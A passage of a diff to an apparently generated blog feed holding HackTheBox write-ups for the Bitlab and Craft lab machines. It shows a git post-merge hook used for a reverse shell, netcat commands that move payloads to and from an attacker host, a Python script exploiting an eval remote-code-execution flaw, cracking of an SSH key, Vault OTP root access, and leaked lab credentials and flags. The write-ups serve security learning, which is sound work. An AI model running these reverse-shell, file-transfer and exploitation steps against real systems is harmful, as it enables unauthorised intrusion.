+  &lt;li&gt;You make changes in both repos, so when you use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt;, a merge is forced.&lt;/li&gt;
+  &lt;li&gt;You can create a file “local/.git/hooks/post-merge”, that gets executed when you &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.tar&lt;/code&gt;, the script that gets executed is a reverse shell. You can look throught the provided files to get a feel for it.&lt;/p&gt;
+
+&lt;p&gt;We upload our payload to the server using netcat.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &amp;gt; payload.tar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lv -p 4444 &amp;lt; payload.tar
+listening on [any] 4444 ...
+connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next we unpack it and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo git pull&lt;/code&gt;. Remember we have to have netcat running on our end to receive the reverse shell.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;p0wny@shell:/tmp# tar xf payload.tar
+p0wny@shell:/tmp# cd payload/payload
+p0wny@shell:…/payload/payload# sudo git pull
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lv -p 4444
+listening on [any] 4444 ...
+connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 59150
+# /bin/bash
+/bin/bash
+root@bitlab:/tmp/payload/payload#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome. Now we can get the root and user flags.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@bitlab:/# cat /home/clave/user.txt
+cat /home/clave/user.txt
+1e3fd81ec3aa2f1462370ee3c20b8154
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@bitlab:/# cat /root/root.txt
+cat /root/root.txt
+8d4cc131757957cb68d9a0cddccd587c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Git hooks can be leveraged to gain privilege escalation / command execution.&lt;/li&gt;
+  &lt;li&gt;Open directories can leak sensitive information.&lt;/li&gt;
+  &lt;li&gt;Always enumerate for directories (dirbuster would have found both the profile page and the open help directory, we got lucky).&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="writeups" /><summary type="html">HackTheBox :: Bitlab</summary></entry><entry><title type="html">HackTheBox :: Craft</title><link href="https://sradley.github.io/writeups/2020/12/25/htb-craft.html" rel="alternate" type="text/html" title="HackTheBox :: Craft" /><published>2020-12-25T00:00:00+08:00</published><updated>2020-12-25T00:00:00+08:00</updated><id>https://sradley.github.io/writeups/2020/12/25/htb-craft</id><content type="html" xml:base="https://sradley.github.io/writeups/2020/12/25/htb-craft.html">&lt;h1 id=&quot;hackthebox--craft&quot;&gt;HackTheBox :: Craft&lt;/h1&gt;
 
 &lt;h2 id=&quot;initial-enumeration&quot;&gt;Initial Enumeration&lt;/h2&gt;
 &lt;p&gt;Let’s start our initial enumeration by performing a tcp port scan.&lt;/p&gt;
@@ -51,17 +199,13 @@ SF-Port6022-TCP:V=7.80%I=7%D=12/31%Time=5E0A1C5C%P=x86_64-pc-linux-gnu%r(N
 SF:ULL,C,&quot;SSH-2\.0-Go\r\n&quot;);
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Nothing particularly interesting here. An HTTPS server running on port 443, and a weird looking SSH
-server running on port 6022. Some research on the technologies behind the 6022 SSH server reveal
-some username enumeration vulnerabilities but nothing of note.&lt;/p&gt;
+&lt;p&gt;Nothing particularly interesting here. An HTTPS server running on port 443, and a weird looking SSH server running on port 6022. Some research on the technologies behind the 6022 SSH server reveal some username enumeration vulnerabilities but nothing of note.&lt;/p&gt;
 
-&lt;p&gt;Let’s fire up burpsuite and begin spidering the HTTPS server (let’s not forget to add “craft.htb”
-to our /etc/hosts file). We just want to get a feel for what is on the site.&lt;/p&gt;
+&lt;p&gt;Let’s fire up burpsuite and begin spidering the HTTPS server (let’s not forget to add “craft.htb” to our /etc/hosts file). We just want to get a feel for what is on the site.&lt;/p&gt;
 
-&lt;p&gt;The first thing that jumps out at me are links to two virtual hosts “api.craft.htb”, and
-“gogs.craft.htb”. Before jumping to those subdomains, we should probably do some vhost discovery.
-Let’s fire up gobuster and take a look.&lt;/p&gt;
+&lt;p&gt;The first thing that jumps out at me are links to two virtual hosts “api.craft.htb”, and “gogs.craft.htb”. Before jumping to those subdomains, we should probably do some vhost discovery. Let’s fire up gobuster and take a look.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gobuster vhost -u https://craft.htb --wordlist=SecLists/Discovery/Web-Content/common.txt -k
 ===============================================================
 Gobuster v3.0.1
@@ -81,40 +225,30 @@ Found: vault.craft.htb (Status: 404) [Size: 19]
 2019/12/31 02:58:55 Finished
 ===============================================================
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Nice, so we found another vhost; “vault.craft.htb”. I think our next step should be to visit the
-“api.craft.htb” vhost, so let’s add this to our scope on burp and begin enumeration (note: don’t
-forget to add the vhosts to your /etc/hosts file).&lt;/p&gt;
+&lt;p&gt;Nice, so we found another vhost; “vault.craft.htb”. I think our next step should be to visit the “api.craft.htb” vhost, so let’s add this to our scope on burp and begin enumeration (note: don’t forget to add the vhosts to your /etc/hosts file).&lt;/p&gt;
 
-&lt;p&gt;Just a swagger api spec here, however this vhost does appear to contain all the api functionality
-for some application, could be a way in, but we’ll take a closer look later. Let’s have a look at
-the “gogs.craft.htb” vhost next.&lt;/p&gt;
+&lt;p&gt;Just a swagger api spec here, however this vhost does appear to contain all the api functionality for some application, could be a way in, but we’ll take a closer look later. Let’s have a look at the “gogs.craft.htb” vhost next.&lt;/p&gt;
 
-&lt;p&gt;This page is a lot more interesting. It’s a self-hosted git management service. When we visit the
-“explore” link, we discover what looks like the repository for the api we discovered earlier.
-Digging through the issues and commit history we find some credentials for the api in a test script
-that Dinesh uploaded, but later removed. Oh no, Dinesh.&lt;/p&gt;
+&lt;p&gt;This page is a lot more interesting. It’s a self-hosted git management service. When we visit the “explore” link, we discover what looks like the repository for the api we discovered earlier. Digging through the issues and commit history we find some credentials for the api in a test script that Dinesh uploaded, but later removed. Oh no, Dinesh.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; request will confirm whether
-these credentials are still valid.&lt;/p&gt;
+&lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; request will confirm whether these credentials are still valid.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://api.craft.htb/api/auth/login -u dinesh:4aUh0A8PbVJxgd -k
 {&quot;token&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc3NzMzNTYwfQ.oLb0iw5P-JOaWpB3Jjq14VwIm8AJRmp3lQjcNY014lY&quot;}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;They’re still valid. Oh no, Dinesh. Why? I hope you haven’t re-used these credentials for the
-git management service. Let’s give them a try.&lt;/p&gt;
+&lt;p&gt;They’re still valid. Oh no, Dinesh. Why? I hope you haven’t re-used these credentials for the git management service. Let’s give them a try.&lt;/p&gt;
 
-&lt;p&gt;Sigh, they worked. I’m not sure what I expected. Let’s dig around some more now that we have access
-to Dinesh’s account.&lt;/p&gt;
+&lt;p&gt;Sigh, they worked. I’m not sure what I expected. Let’s dig around some more now that we have access to Dinesh’s account.&lt;/p&gt;
 
 &lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
-&lt;p&gt;So a bit more digging around with Dinesh’s account didn’t reveal anything too important. However I
-went through all the commits again we find a fix that Dinesh committed. Where he used an eval
-statement on user input. Oh, Dinesh. Unfortunately we need credentials to use it. But guess who
-leaked their credentials earlier? Thanks, Dinesh. Now we just need to figure out how we can get
-RCE. Let’s write a quick python script to leverage this and see if we can get a reverse shell.&lt;/p&gt;
+&lt;p&gt;So a bit more digging around with Dinesh’s account didn’t reveal anything too important. However went through all the commits again we find a fix that Dinesh committed. Where he used an eval statement on user input. Oh, Dinesh.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately we need credentials to use it. But guess who leaked their credentials earlier? Thanks, Dinesh. Now we just need to figure out how we can get RCE. Let’s write a quick python script to leverage this and see if we can get a reverse shell.&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
 &lt;/span&gt;
@@ -155,6 +289,7 @@ RCE. Let’s write a quick python script to leverage this and see if we can get 
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'brew/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;Let’s start up netcat on our end… and we have a shell.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lv -p 4444
@@ -166,28 +301,25 @@ craft_api
 dbtest.py
 tests
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;getting-user&quot;&gt;Getting User&lt;/h2&gt;
-&lt;p&gt;So, a few things to note: we’re logged in as root, but we can’t &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /root/root.txt&lt;/code&gt;. In
-conclusion, we are in a jail. Let’s do some digging around on the server for now, there seem to be
-a few interesting files.&lt;/p&gt;
+&lt;p&gt;So, a few things to note: we’re logged in as root, but we can’t &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /root/root.txt&lt;/code&gt;. In conclusion, we are in a jail. Let’s do some digging around on the server for now, there seem to be a few interesting files.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# whoami
 root
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;After a tiny bit of digging I ran into a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbtest.py&lt;/code&gt; (we ran into it earlier on the
-git repo too), and it seems to connect and query the database successfully. So what happens if we
-upload our own version that allows us to execute arbitrary queries? With a slight modification to
-our foothold script we can upload a file to the server.&lt;/p&gt;
+&lt;p&gt;After a tiny bit of digging I ran into a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbtest.py&lt;/code&gt; (we ran into it earlier on the git repo too), and it seems to connect and query the database successfully. So what happens if we upload our own version that allows us to execute arbitrary queries? With a slight modification to our foothold script we can upload a file to the server.&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PAYLOAD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'nc 10.10.xx.xx 4444 &amp;gt; database.py'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lv -p 4444 &amp;lt; database.py
 listening on [any] 4444 ...
 connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 4220
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Now let’s list the tables for the database, and see if we can read some of the more interesting
-sounding ones.&lt;/p&gt;
+&lt;p&gt;Now let’s list the tables for the database, and see if we can read some of the more interesting sounding ones.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lv -p 4444
 listening on [any] 4444 ...
@@ -212,15 +344,11 @@ tests
  &amp;gt;&amp;gt; exit
 # exit
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Awesome! More credentials. I wonder if any of these will work for the web server? Let’s try logging
-into the git management service with these new credentials.&lt;/p&gt;
+&lt;p&gt;Awesome! More credentials. I wonder if any of these will work for the web server? Let’s try logging into the git management service with these new credentials.&lt;/p&gt;
 
-&lt;p&gt;Gilfoyle! Of all the people I wouldn’t have expected to re-use credentials, it was you? Even
-Erlich didn’t re-use his for the git management service! Anyway, a bit of clicking around reveals a
-new private repository. And in this repository… an ssh key! More credentials, yikes, but at least
-this repo is private. Let’s try and use this new key, taking a look at the public key, it looks
-like he used the username “gilfoyle”.&lt;/p&gt;
+&lt;p&gt;Gilfoyle! Of all the people I wouldn’t have expected to re-use credentials, it was you? Even Erlich didn’t re-use his for the git management service! Anyway, a bit of clicking around reveals a new private repository. And in this repository… an ssh key! More credentials, yikes, but at least this repo is private. Let’s try and use this new key, taking a look at the public key, it looks like he used the username “gilfoyle”.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -i ssh_gilfoyle gilfoyle@10.10.10.110
 
   .   *   ..  . *  *
@@ -239,6 +367,7 @@ like he used the username “gilfoyle”.&lt;/p&gt;
 
 Enter passphrase for key 'keys/ssh_gilfoyle':
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ah, a password. No matter. Let’s get cracking.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ /usr/share/john/ssh2john.py ssh_gilfoyle &amp;gt; ssh_gilfoyle.hash
@@ -252,9 +381,9 @@ Note: This format may emit false positives, so it will keep trying even after
 finding a possible candidate.
 Press 'q' or Ctrl-C to abort, almost any other key for status
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Wow, nothing? I guess we’ll try the password he re-used for the git service, since the guys at
-Pied Piper seem to like re-using credentials.&lt;/p&gt;
+&lt;p&gt;Wow, nothing? I guess we’ll try the password he re-used for the git service, since the guys at Pied Piper seem to like re-using credentials.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -i keys/ssh_gilfoyle gilfoyle@10.10.10.110
 
 
@@ -277,17 +406,16 @@ Pied Piper seem to like re-using credentials.&lt;/p&gt;
 Enter passphrase for key 'keys/ssh_gilfoyle':
 gilfoyle@craft:~$ 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;And… we’re in. So much credential re-use. Guys, get a password manager, seriously. Let’s get the
-user flag now.&lt;/p&gt;
+&lt;p&gt;And… we’re in. So much credential re-use. Guys, get a password manager, seriously. Let’s get the user flag now.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gilfoyle@craft:~$ cat user.txt 
 bbf4b0cadfa3d4e6d0914c9cd5a612d4
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;getting-root&quot;&gt;Getting Root&lt;/h2&gt;
-&lt;p&gt;To start, let’s take a look at Gilfoyle’s home directory. Interesting, a file called .vault-token?
-We’ve seen mentions of a “vault” around the git repo and we found a vhost with the name “vault”.
-Let’s take a look at the files we saw on the git repo.&lt;/p&gt;
+&lt;p&gt;To start, let’s take a look at Gilfoyle’s home directory. Interesting, a file called .vault-token  We’ve seen mentions of a “vault” around the git repo and we found a vhost with the name “vault”. Let’s take a look at the files we saw on the git repo.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vault secrets enable ssh
 
 vault write ssh/roles/root_otp \
@@ -295,24 +423,23 @@ vault write ssh/roles/root_otp \
     default_user=root \
     cidr_list=0.0.0.0/0
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Interesting. Seems like there is some sort of SSH system here. I think it’s time to do some
-Googling and see what we can find out about this service.&lt;/p&gt;
+&lt;p&gt;Interesting. Seems like there is some sort of SSH system here. I think it’s time to do some Googling and see what we can find out about this service.&lt;/p&gt;
 
-&lt;p&gt;So after a bit of research it’s pretty obvious that this is set up as a OTP authentication system
-for SSH. You can read more about it
-&lt;a href=&quot;https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html&quot;&gt;here&lt;/a&gt;. It seems that
-this one is set up for SSH’ing in as root, nice. Let’s give this a go.&lt;/p&gt;
+&lt;p&gt;So after a bit of research it’s pretty obvious that this is set up as a OTP authentication system for SSH. You can read more about it &lt;a href=&quot;https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html&quot;&gt;here&lt;/a&gt;. It seems that this one is set up for SSH’ing in as root, nice. Let’s give this a go.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.10.10.110
 OTP for the session is: 91220244-1b96-5827-2533-9e05874b36b2
 Password:
 root@craft:~#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;Perfect, it worked. Let’s get the root flag.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@craft:~# cat root.txt 
 831d64ef54d92c1af795daae28a11591
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h2&gt;
 &lt;ul&gt;
